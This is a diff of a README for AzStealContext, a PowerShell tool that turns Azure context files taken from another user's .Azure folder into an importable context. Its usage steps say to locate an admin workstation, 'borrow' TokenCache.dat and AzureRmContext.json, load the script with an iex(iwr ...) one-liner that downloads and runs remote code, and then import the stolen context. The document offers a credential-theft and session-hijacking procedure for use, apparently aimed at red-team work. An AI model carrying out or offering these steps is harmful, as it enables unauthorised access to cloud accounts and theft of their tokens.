@@ -1,2 +1,20 @@
 # AzStealContext
-A PowerShell function that automates the process of stealing the Azure context of a users .Azure folder.
+
+A PowerShell function that automates the process of stealing the Azure context of a users .Azure folder. 
+
+The AzureRmContext file can have multiple 'contexts'. This happens if the `Connect-AzAccount` is run multiple times by the same user with different credentials. This function will verify if there are multiple contexts and if so, will ask you which one to use as the default context. 
+
+
+## Usage
+1. Find a Admin workstation / Userprofile that has the `.Azure` folder.
+2. 'Borrow' the `TokenCache.dat` and `AzureRmContext.json` files.
+3. Load this function. `iex(iwr https://raw.githubusercontent.com/justin-p/AzStealContext/master/Invoke-AzStealContext.ps1).content)`
+4. Run the function
+   - To prepair a AzContext file: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files'`
+   - To prepair and Import a AzContext file: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext`
+   - Overwrite a existing OutFile: `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -ImportContext -Force`
+   - To change the default OutFile `Invoke-AzStealContext -Path 'Path\To\Borrowed\Files' -OutFile 'CustomFilename.json'`
+   
+# Contributing
+
+Feel free to open issues, contribute and submit your Pull Requests. You can also ping me on Twitter (@JustinPerdok)
